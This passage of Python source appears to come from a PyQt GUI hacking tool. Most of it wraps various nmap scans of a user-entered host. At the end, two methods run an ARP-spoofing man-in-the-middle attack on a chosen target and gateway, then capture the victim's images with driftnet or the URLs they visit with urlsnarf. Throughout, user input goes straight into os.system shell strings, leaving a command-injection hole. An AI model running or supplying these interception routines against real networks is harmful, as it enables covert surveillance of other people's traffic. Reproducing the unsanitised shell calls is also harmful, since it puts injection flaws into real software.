                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_5(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Version scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Port version scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Port version scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sV -sC {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_6(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap OS Info scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("OS info scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setText("OS info scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -O {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_7(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Fast scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Fast scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setText("Fast scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -F {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_8(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap All scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("All scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setText("All scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sV -sC -A -O -sT -p- {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_9(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setIcon(QMessageBox.Warning)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap DNS Parsing scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("DNS parsing scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setText("DNS parsing scan is starting,please wait..")
                    msg.exec_()
                    os.system("nmap -Pn -n --system-dns {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_10(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap IPV6 scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("IPV6 scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("IPV6 scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -6 {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_11(self):
        try:
            if self.lineEdit_site.text()=="" and self.lineEdit_port.text()=="":
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Please enter the site adress or IP adress and port numbers!")
                msg2.exec_()
            elif self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            elif self.lineEdit_port.text()=="":
                msg6 = QMessageBox()
                msg6.setWindowTitle("Information")
                msg6.setBaseSize(300,300)
                msg6.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg6.setIcon(QMessageBox.Warning)
                msg6.setText("Please enter the ports!")
                msg6.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Ports scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Port version scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Port version scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sS -sV -sC -n -v -p {} {} -oN output.txt".format(self.lineEdit_port.text(),self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_12(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Hosts scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Host scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Host scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sP -T4 {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_13(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap FIN scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Standard scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sF -v {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Critical)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_14(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap XMass Tree scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Standard scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sX -v {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_15(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Ping scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Standard scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sP -v {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def clear(self):
        msgbox = QMessageBox(QMessageBox.Question, "Riglsable", "Are you sure you want to clear the results?")
        msgbox.addButton(QMessageBox.Yes)
        msgbox.addButton(QMessageBox.No)
        msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
        msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
        reply = msgbox.exec()
        if reply==QMessageBox.Yes:
            self.plainTextEdit_result.clear()
    def sniff_image(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and Gateway IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the Gateway IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            os.system("gnome-terminal --window -x driftnet -i eth0")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg.setText("Attack initiating,please wait...")
            msg.setIcon(QMessageBox.Information)
            msg.exec_()
    def sniff_url(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and Gateway IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the Gateway IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            os.system("gnome-terminal --window -x urlsnarf -i eth0")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg.setText("Attack initiating,please wait...")
            msg.setIcon(QMessageBox.Information)
            msg.exec_()
    def block_net(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and Gateway IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
